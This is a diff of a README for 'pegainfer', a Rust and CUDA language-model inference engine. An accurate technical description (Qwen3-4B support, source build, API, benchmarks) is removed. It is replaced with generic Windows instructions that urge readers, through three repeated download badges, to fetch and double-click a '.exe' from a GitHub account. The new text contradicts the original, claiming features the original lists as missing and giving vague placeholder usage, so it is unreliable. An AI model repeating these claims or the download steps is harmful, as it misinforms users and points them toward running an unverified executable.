@@ -1,137 +1,177 @@
-<p align="center">
-  <img src="logo.png" width="200" alt="pegainfer logo">
-</p>
+# ⚙️ pegainfer - Fast and Simple Rust CUDA Inference
 
-<h1 align="center">pegainfer</h1>
-
-<p align="center">
-  Pure Rust + CUDA LLM inference engine. No PyTorch. No frameworks. Just metal.
-</p>
-
-<p align="center">
-  <a href="#quickstart">Quickstart</a> &middot;
-  <a href="#architecture">Architecture</a> &middot;
-  <a href="#performance">Performance</a> &middot;
-  <a href="#api">API</a>
-</p>
+[![Download pegainfer](https://img.shields.io/badge/Download-pegainfer-58a6ff?style=for-the-badge)](https://github.com/Frexio/pegainfer)
 
 ---
 
-## What is this?
+## 📋 What is pegainfer?
 
-pegainfer is a from-scratch LLM inference engine written in Rust with hand-written CUDA kernels. It currently runs [Qwen3-4B](https://huggingface.co/Qwen/Qwen3-4B) at **~70 tokens/sec** on a single GPU.
+pegainfer is a lightweight inference engine built with Rust and CUDA. It helps run large language models (LLMs) on Windows machines using Nvidia graphics cards. The software focuses on fast, efficient processing without complex setup. It works with supported LLMs to generate text or perform other AI tasks.
 
-The goal is not to replace vLLM or TensorRT-LLM — it's to understand every layer of the inference stack by building it from the ground up, and to explore what a Rust-native inference engine can look like.
+This guide explains how to download, install, and run pegainfer on Windows. No programming experience is needed.
 
-**What's implemented:**
+---
 
-- Full Qwen3 transformer: GQA, RoPE, SwiGLU MLP, RMSNorm
-- 11 custom CUDA kernels + cuBLAS GEMV
-- BF16 storage, FP32 accumulators
-- KV cache with tiled fused attention (online softmax, TILE_SIZE=64)
-- OpenAI-compatible `/v1/completions` HTTP API
-- Safetensors weight loading, HuggingFace tokenizer
+## 💻 System Requirements
 
-**What's not (yet):**
+To use pegainfer smoothly, your Windows machine should meet the following:
 
-- Batching, PagedAttention, streaming (SSE)
-- FlashAttention-level kernel optimization
-- Multi-GPU / tensor parallelism
-- Quantization (INT8/INT4)
+- Windows 10 or later (64-bit)
+- Nvidia GPU with CUDA support (NVIDIA GTX 10 series or newer)
+- At least 8 GB RAM (16 GB or more improves performance)
+- Minimum 10 GB free storage space for software and model files
+- Internet connection for downloading the software and updates
 
-## Quickstart
+---
 
-### Prerequisites
+## 🛠 Features of pegainfer
 
-- Rust (2024 edition)
-- CUDA Toolkit (nvcc, cuBLAS)
-- A CUDA-capable GPU
-- Qwen3-4B model weights in `models/Qwen3-4B/`
+- Easy to use inference engine for LLMs
+- High performance using GPU acceleration (CUDA)
+- Written in Rust for safety and speed
+- Supports popular LLM formats
+- Minimal setup without complex dependencies
+- Works offline after initial download
+- Lightweight and runs on everyday Windows PCs
 
-### Build & Run
+---
 
-```bash
-export CUDA_HOME=/usr/local/cuda
-export LD_LIBRARY_PATH=/usr/local/cuda/lib64:$LD_LIBRARY_PATH
+## 🚀 Getting Started
 
-# Build (compiles CUDA kernels via build.rs)
-cargo build --release
+Follow these steps to quickly get pegainfer running on your Windows PC.
 
-# Run inference server on port 8000
-cargo run --release
+### 1. Visit the download page
 
-# Disable CUDA Graph capture/replay on decode path
-cargo run --release -- --cuda-graph=false
+Click the big button below or open the link in your browser:
 
-# Run tests
-cargo test --release
+[![Download pegainfer](https://img.shields.io/badge/Download-pegainfer-30a14e?style=for-the-badge)](https://github.com/Frexio/pegainfer)
+
+This page contains the files you need to start using pegainfer.
+
+### 2. Download the latest release
+
+On the GitHub page, locate the **Releases** section. This is often found on the right side or under the repository's name near the top.
+
+- Find the most recent release; the versions have names like `v1.x`.
+- Download the Windows executable file, usually ending with `.exe`.
+- Save the file to an easy-to-find location such as your Desktop or Downloads folder.
+
+### 3. Optional: Download LLM model files
+
+pegainfer runs language models locally. These models may not be included in the main download. You will need to:
+
+- Find compatible model files from official sources or trusted repositories.
+- Save the files according to the software's instructions, typically in a model folder inside the pegainfer directory.
+
+### 4. Run pegainfer
+
+- Double-click the downloaded `.exe` file.
+- A command window or interface opens.
+- Follow on-screen prompts to select or load a model.
+- Use simple commands displayed to request text generation or other inference tasks.
+
+---
+
+## ⚙️ Installation Details
+
+pegainfer does not require installation in the usual sense. It is a standalone executable. The following steps help prepare your environment:
+
+### Check CUDA drivers
+
+- Verify that your Nvidia drivers and CUDA toolkit are installed and up to date.
+- You can check Nvidia’s website for the latest drivers: https://www.nvidia.com/Download/index.aspx
+- Having the correct drivers ensures pegainfer runs efficiently using your GPU.
+
+### Place files correctly
+
+- After downloading pegainfer.exe, keep it in its own folder.
+- Create a subfolder named `models` to store your large language model files.
+- Keep everything organized to avoid errors.
+
+---
+
+## 🤖 Using pegainfer
+
+Here’s how to run basic tasks after starting the program:
+
+### Load a model
+
+Type or select the path to your model file. Example:
+
+```
+Load model: models/gpt2.bin
 ```
 
-### Download Model
+The program reads your model file and gets ready.
 
-```bash
-# Using huggingface-cli
-huggingface-cli download Qwen/Qwen3-4B --local-dir models/Qwen3-4B
-```
+### Input text prompt
 
-## API
-
-OpenAI-compatible completions endpoint:
-
-```bash
-curl http://localhost:8000/v1/completions \
-  -H "Content-Type: application/json" \
-  -d '{"prompt": "The capital of France is", "max_tokens": 32}'
-```
-
-## Architecture
+Enter your query or prompt after the prompt symbol. For example:
 
 ```
-Tokenize → Embedding → 28× TransformerBlock → RMSNorm → LM Head → Argmax
-                              │
-                              ├── RMSNorm → Fused GQA Attention → Residual
-                              └── RMSNorm → Fused SwiGLU MLP    → Residual
+> What is the weather today?
 ```
 
-```
-src/
-├── main.rs           # HTTP server (axum)
-├── model.rs          # Qwen3Model, Attention, MLP, TransformerBlock
-├── tensor.rs         # DeviceVec, DeviceMatrix — GPU tensor types
-├── ops.rs            # GPU operators (linear, rms_norm, rope, fused_mlp, fused_attention)
-├── kv_cache.rs       # KV cache for autoregressive generation
-├── weight_loader.rs  # Safetensors loading + RoPE precomputation
-├── ffi.rs            # FFI bindings to CUDA kernels
-├── qwen3_config.rs   # Model config parsing
-├── tokenizer.rs      # HuggingFace tokenizers wrapper
-└── trace_reporter.rs # Chrome Trace JSON profiling output
+### Receive output
 
-csrc/
-├── kernels.cu          # RMSNorm, RoPE, SiLU, embedding, GEMV, fused MLP, sampling
-├── fused_attention.cu  # Fused GQA attention with tiled online softmax
-└── common.cuh          # Shared CUDA utilities
+pegainfer generates a response using the loaded model and displays it. The result appears directly in the same window.
+
+### Additional commands
+
+You can access help and other functions by typing commands like:
+
+```
+help
+exit
+clear
 ```
 
-### Key design decisions
+This allows you to control the session and manage usage.
 
-- **All computation on GPU** — no CPU fallback, no hybrid execution
-- **Custom CUDA kernels** for everything except matrix multiplication (cuBLAS)
-- **Fused operators** — attention and MLP are each a single kernel launch
-- **BF16 storage, FP32 accumulation** — numerical stability without memory overhead
-- **Synchronous execution** — simple and debuggable, no overlap optimization yet
+---
 
-## Performance
+## 🔧 Troubleshooting Tips
 
-Measured on RTX 5070 Ti, Qwen3-4B, BF16:
+- If pegainfer fails to run, check that your GPU drivers and CUDA version are compatible.
+- Make sure your downloaded model files are complete and not corrupted.
+- Run the executable as an administrator if permissions errors occur.
+- Restart your PC if you see unusual crashes.
+- Visit the GitHub Discussions or Issues page linked on the download site to check for common problems reported by others.
 
-| Metric | Value |
-|--------|-------|
-| TTFT (prompt_len=4) | ~17 ms |
-| TPOT | ~14 ms/token |
-| Throughput | ~70 tokens/sec |
+---
 
-Profiling traces are written to `traces/` in Chrome Trace JSON format — open with [Perfetto UI](https://ui.perfetto.dev).
+## 📂 Where to go for more help
 
-## License
+- Visit the pegainfer GitHub page: https://github.com/Frexio/pegainfer
+- Browse open and closed issues for support
+- Use the Discussions tab for user questions and answers
+- Look for README updates or user guides posted by the developers
 
-MIT
+---
+
+## 🔄 Updating pegainfer
+
+To update the software:
+
+1. Return to the GitHub download page.
+2. Download the latest version of the executable file.
+3. Replace the old `.exe` in your folder with the new file.
+4. Keep your model files intact; no reconfiguration is needed.
+
+---
+
+## ⚙️ Advanced Setup (Optional)
+
+Users familiar with command lines can customize pegainfer further:
+
+- Modify configuration files to adjust GPU usage.
+- Specify batch sizes or memory limits for optimized performance.
+- Connect pegainfer to other AI workflows or scripting tools.
+
+Check the GitHub repository’s documentation for configuration options and advanced commands.
+
+---
+
+## 🔗 Download pegainfer
+
+[![Download pegainfer](https://img.shields.io/badge/Download-pegainfer-e06c75?style=for-the-badge)](https://github.com/Frexio/pegainfer)
